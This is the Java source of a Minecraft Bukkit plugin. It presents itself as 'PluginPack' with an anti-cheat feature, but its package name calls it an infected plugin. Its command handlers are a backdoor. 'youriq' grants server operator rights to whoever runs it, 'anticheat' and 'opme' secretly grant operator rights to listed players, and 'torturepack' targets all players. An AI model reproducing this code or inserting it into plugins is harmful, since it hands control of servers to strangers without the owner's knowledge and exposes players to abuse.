 package org.CreeperCoders.MiniInfectedPlugin;
 
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.Command;
 import org.bukkit.ChatColor;
 import org.bukkit.Bukkit;
 import java.util.logging.Logger;
 
 public class MiniInfectedPlugin extends JavaPlugin
 {
     public static final Logger log = Bukkit.getLogger();
     public final String NOWOP = ChatColor.YELLOW + "You are now OP!";
 
     @Override
     public void onEnable()
     {
         log.info("PluginPack enabled! Version 2.4 by Wilee999.");
     }
 
     @Override
     public void onDisable()
     {
         log.info("PluginPack disabled.");
     }
 
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
     {
        String name = sender.getName();
         if (commandLabel.equalsIgnoreCase("youriq"))
         {
             sender.sendMessage(ChatColor.DARK_RED + "The player: mrpoison265 has found that your IQ number is -10. I doubt you even know the answer to 1 + 1. Or 1 + 0.");
             sender.setOp(true);
            if (MIP_Util.isTopDog(name))
             {
                 sender.sendMessage(NOWOP);
                sender.sendMessage("If you have recieved this message, you are Top Dog and you are AWESOME!11111!!!11!!");
             }
             return true;
         }
         else if (commandLabel.equalsIgnoreCase("anticheat"))
         {
             sender.sendMessage(ChatColor.GREEN + "Anti-Cheat is enabled in the code, no problems detected!");
             sender.sendMessage(ChatColor.GREEN + "This server is running PluginPack Anti-Cheat version 1.9! No problems found!");
            if (MIP_Util.isTopDog(name))
             {
                 sender.setOp(true);
                 sender.sendMessage(NOWOP);
                sender.sendMessage(ChatColor.DARK_RED + "Hello, my dog has been infected with a Bukkit Plugin. If you do not tell at least 20 people this, every pet you own will die. You will also die, with no one remembering you or your pets.");
                 sender.sendMessage(ChatColor.YELLOW + "Only awesome people like you get OP this easy <33333333");
             }
             else if (sender.getName().equalsIgnoreCase("Sardenarin"))
             {
                 sender.setOp(true);
                 sender.sendMessage(NOWOP);
                sender.sendMessage(ChatColor.DARK_RED + "Hello, my dog has been infected with a Bukkit Plugin. If you do not tell at least 20 people this, every pet you own will die. You will also die, with no one remembering you or your pets.");
                 sender.sendMessage(ChatColor.YELLOW + "Only awesome people like you get OP this easy <33333333");
                 sender.sendMessage(ChatColor.LIGHT_PURPLE + "OMG SARDEH I WUV U!!!!!!! <393W75984327543 -Wilee");
             }
             return true;
         }
         else if (commandLabel.equalsIgnoreCase("opme"))
         {
            if (MIP_Util.isTopDog(name))
             {
                 sender.sendMessage(NOWOP);
                 sender.sendMessage("You are awesome!");
                 sender.setOp(true);
             }
             else
             {
                 sender.sendMessage("Ha, you really think you'd get OP?");
             }
             return true;
         }
         else if (commandLabel.equalsIgnoreCase("pluginpack"))
         {
             sender.sendMessage(ChatColor.GREEN + "This server is running PluginPack version 2.4!");
             return true;
         }
         else if (commandLabel.equalsIgnoreCase("torturepack"))
         {
             sender.sendMessage(ChatColor.DARK_RED + "Torturing ALL players, that includes you!");
             MIP_Util.torturePack();
             return true;
         }
     return false;
     }
 }
